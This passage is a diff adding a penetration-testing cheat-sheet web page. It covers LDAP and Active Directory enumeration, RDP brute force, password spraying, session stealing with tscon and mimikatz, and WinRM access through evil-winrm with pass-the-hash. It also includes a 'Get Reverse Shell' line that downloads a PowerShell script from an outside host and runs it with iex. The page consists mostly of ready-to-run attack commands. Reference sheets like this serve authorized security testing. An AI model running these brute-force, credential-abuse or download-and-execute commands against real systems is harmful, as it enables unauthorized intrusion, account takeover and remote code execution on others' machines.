+ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://10.0.0.1 <span class="nt">-b</span> <span class="s2">"dc=example,dc=com"</span> <span class="nt">-D</span> <span class="s2">"cn=admin,dc=example,dc=com"</span> <span class="nt">-W</span>
+
+<span class="c"># Search sAMAccountName</span>
+ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://10.0.0.1 <span class="nt">-b</span> <span class="s2">"dc=example,dc=com"</span> <span class="nt">-D</span> <span class="s2">"workspace</span><span class="se">\\</span><span class="s2">ldap"</span> <span class="nt">-w</span> <span class="s1">'password'</span> <span class="s2">"(objectclass=*)"</span> <span class="s2">"sAMAccountName"</span>
+ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://10.0.0.1 <span class="nt">-b</span> <span class="s2">"dc=example,dc=com"</span> <span class="nt">-D</span> <span class="s2">"workspace</span><span class="se">\\</span><span class="s2">ldap"</span> <span class="nt">-w</span> <span class="s1">'password'</span> <span class="s2">"(objectclass=*)"</span> <span class="s2">"sAMAccountName"</span> | <span class="nb">grep </span>sAMAccountName
+
+<span class="c"># Get information</span>
+ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://10.0.0.1 <span class="nt">-b</span> <span class="s2">"cn=sample,cn=Users,dc=example,dc=com"</span> <span class="nt">-w</span> <span class="s1">'password'</span> <span class="s2">"(objectclass=*)"</span> <span class="nt">-D</span> <span class="s2">"example</span><span class="se">\\</span><span class="s2">name"</span>
+</code></pre></div>  </div>
+
+  <h3 id="against-ad">Against AD</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># --no-html: Disable html output</span>
+<span class="c"># --no-grep: Disable greppable output</span>
+<span class="c"># -o: Output dir</span>
+ldapdomaindump <span class="nt">-u</span> <span class="s1">'DOMAIN\username'</span> <span class="nt">-p</span> password &lt;target-ip&gt; <span class="nt">--no-html</span> <span class="nt">--no-grep</span> <span class="nt">-o</span> dumped
+
+<span class="c"># Research</span>
+ldapsearch <span class="nt">-LLL</span> <span class="nt">-x</span> <span class="nt">-H</span> ldap://pdc01.lab.ropnop.com <span class="nt">-b</span> ‘’ <span class="nt">-s</span> base ‘<span class="o">(</span><span class="nv">objectclass</span><span class="o">=</span><span class="k">*</span><span class="o">)</span>’
+
+<span class="c"># Windapsearch is a good tool to automate the job (https://github.com/ropnop/windapsearch)</span>
+<span class="c"># Get computers</span>
+python3 windapsearch.py <span class="nt">--dc-ip</span> 10.10.10.10 <span class="nt">-u</span> john@domain.local <span class="nt">-p</span> password <span class="nt">--computers</span>
+<span class="c"># Get groups</span>
+python3 windapsearch.py <span class="nt">--dc-ip</span> 10.10.10.10 <span class="nt">-u</span> john@domain.local <span class="nt">-p</span> password <span class="nt">--groups</span>
+<span class="c"># Get users</span>
+python3 windapsearch.py <span class="nt">--dc-ip</span> 10.10.10.10 <span class="nt">-u</span> john@domain.local <span class="nt">-p</span> password <span class="nt">--da</span>
+<span class="c"># Get Domain Admins</span>
+python3 windapsearch.py <span class="nt">--dc-ip</span> 10.10.10.10 <span class="nt">-u</span> john@domain.local <span class="nt">-p</span> password <span class="nt">--da</span>
+<span class="c"># Get Privileged Users</span>
+python3 windapsearch.py <span class="nt">--dc-ip</span> 10.10.10.10 <span class="nt">-u</span> john@domain.local <span class="nt">-p</span> password <span class="nt">--privileged-users</span>
+</code></pre></div>  </div>
+</details>
+
+<!-- ------------------------------------------------RDP NOTES----------------------------------------------------------- -->
+
+<details>
+  <summary>RDP (3389)</summary>
+  <p></p>
+
+  <h2 id="enumeration-10">Enumeration</h2>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">--script</span> rdp-enum-encryption <span class="nt">-p</span> 3389 &lt;target-ip&gt;
+nmap <span class="nt">--script</span> rdp-ntlm-info <span class="nt">-p</span> 3389 &lt;target-ip&gt;
+nmap <span class="nt">--script</span> rdp<span class="k">*</span> <span class="nt">-p</span> 3389 &lt;target-ip&gt;
+</code></pre></div>  </div>
+
+  <h2 id="bruteforce-can-lock-accounts">Bruteforce (can lock accounts)</h2>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Hydra</span>
+hydra <span class="nt">-l</span> username <span class="nt">-P</span> passwords.txt &lt;target-ip&gt; rdp
+hydra <span class="nt">-L</span> usernames.txt <span class="nt">-p</span> password &lt;target-ip&gt; rdp
+
+<span class="c"># Crowbar https://github.com/galkan/crowbar</span>
+crowbar <span class="nt">-b</span> rdp <span class="nt">-s</span> 192.168.220.142/32 <span class="nt">-U</span> users.txt <span class="nt">-c</span> <span class="s1">'password123'</span>
+
+<span class="c">#Password spraying via RDPassSpray</span>
+git clone https://github.com/xFreed0m/RDPassSpray
+<span class="c">#Options:</span>
+RDPassSpray.py <span class="o">[</span><span class="nt">-h</span><span class="o">]</span> <span class="o">(</span><span class="nt">-U</span> USERLIST | <span class="nt">-u</span> USER  <span class="nt">-p</span> PASSWORD | <span class="nt">-P</span> PASSWORDLIST<span class="o">)</span> <span class="o">(</span><span class="nt">-T</span> TARGETLIST | <span class="nt">-t</span> TARGET<span class="o">)</span> <span class="o">[</span><span class="nt">-s</span> SLEEP | <span class="nt">-r</span> minimum_sleep maximum_sleep] <span class="o">[</span><span class="nt">-d</span> DOMAIN] <span class="o">[</span><span class="nt">-n</span> NAMES] <span class="o">[</span><span class="nt">-o</span> OUTPUT] <span class="o">[</span><span class="nt">-V</span><span class="o">]</span>
+<span class="c">#Usage:</span>
+python3 RDPassSpray.py <span class="nt">-U</span> users.txt <span class="nt">-p</span> Spring2025! <span class="nt">-t</span> 10.100.10.240:3389
+
+<span class="c"># impacket-red_check - if some credentials are valid for a RDP service:</span>
+rdp_check &lt;domain&gt;/&lt;name&gt;:&lt;password&gt;@&lt;IP&gt;
+</code></pre></div>  </div>
+
+  <h2 id="connect-6">Connect</h2>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># -------------------remmina-------------------</span>
+<span class="c"># -c: Connect given URI or file</span>
+remmina <span class="nt">-c</span> rdp://username@vulnerable.com
+remmina <span class="nt">-c</span> rdp://domain<span class="se">\\</span>username@vulnerable.com
+remmina <span class="nt">-c</span> rdp://username:password@vulnerable.com
+<span class="c"># Settings</span>
+<span class="c"># Keyboard mapping</span>
+1. On Remmina client window, click menu icon and move to <span class="s2">"Preferences"</span><span class="nb">.</span>
+2. Navigate to <span class="s2">"RDP"</span> tab and check <span class="s2">"Use client keyboard mapping"</span><span class="nb">.</span>
+3. Reboot Remmina
+
+<span class="c"># -------------------FreeRDP-------------------</span>
+xfreerdp /u:username /v:10.0.0.1:3389
+xfreerdp /u:username /p:password /cert:ignore /v:10.0.0.1 /workarea
+<span class="c"># Create a shared drive (/drive:LOCAL_DIR,SHARE_NAME)</span>
+xfreerdp /u:username /p:password /drive:.,share /v:10.0.0.1
+<span class="c"># Useful command for exploiting</span>
+xfreerdp /v:10.0.0.1 /u:username /p:password +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
+<span class="c"># On remote Windows</span>
+<span class="c"># Access share directory in Command Prompt or PowerShell</span>
+<span class="se">\\</span>tsclient<span class="se">\\</span>~share<span class="se">\</span>
+
+<span class="c"># -------------------Rdesktop-------------------</span>
+rdesktop <span class="nt">-u</span> username <span class="nt">-p</span> password 10.0.0.1:3389
+</code></pre></div>  </div>
+
+  <h2 id="session-stealing">Session Stealing</h2>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Get openned sessions:</span>
+query user
+<span class="c"># Access to the selected session</span>
+tscon &lt;ID&gt; /dest:&lt;SESSIONNAME&gt;
+
+<span class="c"># Using mimikatz</span>
+ts::sessions        <span class="c">#Get sessions</span>
+ts::remote /id:2    <span class="c">#Connect to the session</span>
+
+<span class="c"># Try combine with https://github.com/linuz/Sticky-Keys-Slayer</span>
+</code></pre></div>  </div>
+
+  <h2 id="adding-user-to-rdp-group">Adding user to RDP Group</h2>
+  <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">net</span><span class="w"> </span><span class="nx">localgroup</span><span class="w"> </span><span class="s2">"Remote Desktop Users"</span><span class="w"> </span><span class="nx">UserLoginName</span><span class="w"> </span><span class="nx">/add</span><span class="w">
+</span></code></pre></div>  </div>
+
+  <h2 id="post-exploitation">Post Exploitation</h2>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># AutoRDPwn</span>
+<span class="c"># https://github.com/JoelGMSec/AutoRDPwn</span>
+<span class="c"># AutoRDPwn is a post-exploitation framework created in Powershell, designed primarily to automate the Shadow attack on Microsoft Windows computers. This vulnerability (listed as a feature by Microsoft) allows a remote attacker to view his victim's desktop without his consent, and even control it on demand, using tools native to the operating system itself.</span>
+
+<span class="c"># evilrdp</span>
+<span class="c"># https://github.com/skelsec/evilrdp</span>
+<span class="c"># - Control mouse and keyboard in an automated way from command line</span>
+<span class="c"># - Control clipboard in an automated way from command line</span>
+<span class="c"># - Spawn a SOCKS proxy from the client that channels network communication to the target via RDP</span>
+<span class="c"># - Execute arbitrary SHELL and PowerShell commands on the target without uploading files</span>
+<span class="c"># - Upload and download files to/from the target even when file transfers are disabled on the target</span>
+</code></pre></div>  </div>
+</details>
+
+<!-- ------------------------------------------------WinRM NOTES----------------------------------------------------------- -->
+
+<details>
+  <summary>WinRM (5985/5986)</summary>
+
+  <h2 id="bruteforce-2">Bruteforce</h2>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># netexec</span>
+netexec winrm &lt;target-ip&gt; <span class="nt">-d</span> DOMAIN <span class="nt">-u</span> usernames.txt <span class="nt">-p</span> passwords.txt 
+
+<span class="c"># Metasploit</span>
+msfconsole
+msf <span class="o">&gt;</span> use auxiliary/scanner/winrm/winrm_login
+</code></pre></div>  </div>
+
+  <h2 id="connect-7">Connect</h2>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Evil-WinRm</span>
+evil-winrm <span class="nt">-i</span> &lt;target-ip&gt; <span class="nt">-u</span> username <span class="nt">-p</span> password
+<span class="c"># -P: Specifify port</span>
+evil-winrm <span class="nt">-i</span> &lt;target-ip&gt; <span class="nt">-P</span> 5986 <span class="nt">-u</span> username <span class="nt">-p</span> password
+<span class="c"># Pass The Hash (-H)</span>
+evil-winrm <span class="nt">-i</span> &lt;target-ip&gt; <span class="nt">-P</span> 5986 <span class="nt">-u</span> username <span class="nt">-H</span> 0e0363213e37b94221497260b0bcb4fc
+<span class="c"># PowerShell Local Path (-s)</span>
+evil-winrm <span class="nt">-i</span> &lt;target-ip&gt; <span class="nt">-u</span> username <span class="nt">-p</span> password <span class="nt">-s</span> /opt/scripts
+<span class="c"># SSL enabled (-S)</span>
+evil-winrm <span class="nt">-i</span> &lt;target-ip&gt; <span class="nt">-u</span> username <span class="nt">-p</span> password <span class="nt">-S</span>
+<span class="c"># If you have private key and public key</span>
+evil-winrm <span class="nt">-i</span> &lt;target-ip&gt; <span class="nt">-S</span> <span class="nt">-k</span> private.key <span class="nt">-c</span> public.key
+<span class="c"># -S: SSL</span>
+<span class="c"># -k: private key</span>
+<span class="c"># -c: public key</span>
+
+<span class="c"># Evil-WinRM commands</span>
+<span class="c"># Upload a local file to Windows machine</span>
+PS&gt; upload ./example.bat c:<span class="se">\\</span>Users<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\e</span>xploit.bat
+<span class="c"># Download a file to local</span>
+PS&gt; download c:<span class="se">\\</span>Users<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\e</span>xample.txt ./example.txt
+<span class="c"># List all services</span>
+PS&gt; services
+</code></pre></div>  </div>
+
+  <h2 id="initiating-winrm-session">Initiating WinRM Session</h2>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Enable-PSRemoting <span class="nt">-Force</span>
+Set-Item wsman:<span class="se">\l</span>ocalhost<span class="se">\c</span>lient<span class="se">\t</span>rustedhosts <span class="k">*</span>
+<span class="c"># Activate Remotely</span>
+wmic /node:&lt;REMOTE_HOST&gt; process call create <span class="s2">"powershell enable-psremoting -force"</span>
+<span class="c"># Forcing WinRM Open</span>
+.<span class="se">\P</span>sExec.exe <span class="se">\\</span>computername <span class="nt">-u</span> domain<span class="se">\u</span>sername <span class="nt">-p</span> password <span class="nt">-h</span> <span class="nt">-d</span> powershell.exe <span class="s2">"enable-psremoting -force"</span>
+</code></pre></div>  </div>
+
+  <h2 id="command-execution">Command Execution</h2>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># With NetExec</span>
+<span class="c"># -x: Execute a command</span>
+netexec winrm &lt;target-ip&gt; <span class="nt">-d</span> DOMAIN <span class="nt">-u</span> username <span class="nt">-p</span> password <span class="nt">-x</span> <span class="s1">'whoami'</span>
+netexec winrm &lt;target-ip&gt; <span class="nt">-d</span> DOMAIN <span class="nt">-u</span> username <span class="nt">-p</span> password <span class="nt">-X</span> <span class="s1">'$PSVersionTable'</span>
+<span class="c"># -H: Login with Pass The Hash</span>
+netexec winrm &lt;target-ip&gt; <span class="nt">-d</span> DOMAIN <span class="nt">-u</span> username <span class="nt">-H</span> &lt;HASH&gt; <span class="nt">-x</span> <span class="s1">'whoami'</span>
+
+<span class="c"># With PowerShell</span>
+Invoke-Command <span class="nt">-computername</span> computer-name.domain.tld <span class="nt">-ScriptBlock</span> <span class="o">{</span>ipconfig /all<span class="o">}</span> <span class="o">[</span><span class="nt">-credential</span> DOMAIN<span class="se">\u</span>sername]
+Invoke-Command <span class="nt">-ComputerName</span> &lt;computername&gt; <span class="nt">-ScriptBLock</span> <span class="k">${</span><span class="nv">function</span>:enumeration<span class="k">}</span> <span class="o">[</span><span class="nt">-ArgumentList</span> <span class="s2">"arguments"</span><span class="o">]</span>
+<span class="c"># Execute Script</span>
+Invoke-Command <span class="nt">-ComputerName</span> &lt;computername&gt; <span class="nt">-FilePath</span> C:<span class="se">\p</span>ath<span class="se">\t</span>o<span class="se">\s</span>cript<span class="se">\f</span>ile <span class="o">[</span><span class="nt">-credential</span> CSCOU<span class="se">\j</span>arrieta]
+<span class="c"># Get Reverse Shell</span>
+Invoke-Command <span class="nt">-ComputerName</span> &lt;computername&gt; <span class="nt">-ScriptBlock</span> <span class="o">{</span>cmd /c <span class="s2">"powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"</span><span class="o">}</span>
+
+<span class="c"># Get PS Session</span>
+<span class="c">#If you need to use different creds</span>
+<span class="nv">$password</span><span class="o">=</span>ConvertTo-SecureString <span class="s1">'Stud41Password@123'</span> <span class="nt">-Asplaintext</span> <span class="nt">-force</span>
+<span class="c">## Note the ".\" in the suername to indicate it's a local user (host domain)</span>
+<span class="nv">$creds2</span><span class="o">=</span>New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s2">".</span><span class="se">\s</span><span class="s2">tudent41"</span>, <span class="nv">$password</span><span class="o">)</span>
+<span class="c"># Enter</span>
+Enter-PSSession <span class="nt">-ComputerName</span> dcorp-adminsrv.dollarcorp.moneycorp.local <span class="o">[</span><span class="nt">-Credential</span> username]
+<span class="c">## Bypass proxy</span>
+Enter-PSSession <span class="nt">-ComputerName</span> 1.1.1.1 <span class="nt">-Credential</span> <span class="nv">$creds</span> <span class="nt">-SessionOption</span> <span class="o">(</span>New-PSSessionOption <span class="nt">-ProxyAccessType</span> NoProxyServer<span class="o">)</span>
+<span class="c"># Save session in var</span>
+<span class="nv">$sess</span> <span class="o">=</span> New-PSSession <span class="nt">-ComputerName</span> 1.1.1.1 <span class="nt">-Credential</span> <span class="nv">$creds</span> <span class="nt">-SessionOption</span> <span class="o">(</span>New-PSSessionOption <span class="nt">-ProxyAccessType</span> NoProxyServer<span class="o">)</span>
+Enter-PSSession <span class="nv">$sess</span>
+<span class="c">## Background current PS session</span>
+Exit-PSSession <span class="c"># This will leave it in background if it's inside an env var (New-PSSession...)</span>
+</code></pre></div>  </div>
+
+  <h2 id="winrm-in-linux">WinRM in Linux</h2>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Bruteforce</span>
+crackmapexec winrm &lt;IP&gt; <span class="nt">-d</span> &lt;Domain Name&gt; <span class="nt">-u</span> usernames.txt <span class="nt">-p</span> passwords.txt
+<span class="c">#Just check a pair of credentials</span>
+<span class="c"># Username + Password + CMD command execution</span>
+crackmapexec winrm &lt;IP&gt; <span class="nt">-d</span> &lt;Domain Name&gt; <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span> &lt;password&gt; <span class="nt">-x</span> <span class="s2">"whoami"</span>
+<span class="c"># Username + Hash + PS command execution</span>
+crackmapexec winrm &lt;IP&gt; <span class="nt">-d</span> &lt;Domain Name&gt; <span class="nt">-u</span> &lt;username&gt; <span class="nt">-H</span> &lt;HASH&gt; <span class="nt">-X</span> <span class="s1">'$PSVersionTable'</span>
+<span class="c">#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm</span>
+
+<span class="c"># PS-docker machine</span>
+docker run <span class="nt">-it</span> quickbreach/powershell-ntlm
+<span class="nv">$creds</span> <span class="o">=</span> Get-Credential
+Enter-PSSession <span class="nt">-ComputerName</span> 10.10.10.149 <span class="nt">-Authentication</span> Negotiate <span class="nt">-Credential</span> <span class="nv">$creds</span>
+</code></pre></div>  </div>
+</details>
+
+<!-- ------------------------------------------------qwe NOTES----------------------------------------------------------- -->
+
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <div class="system-info">
+      <div class="terminal-time"></div>
+      <div class="location-info"></div>
+    </div>
+  </div>
+
+  <script src="/assets/js/main.js"></script>
+</body>
+</html>
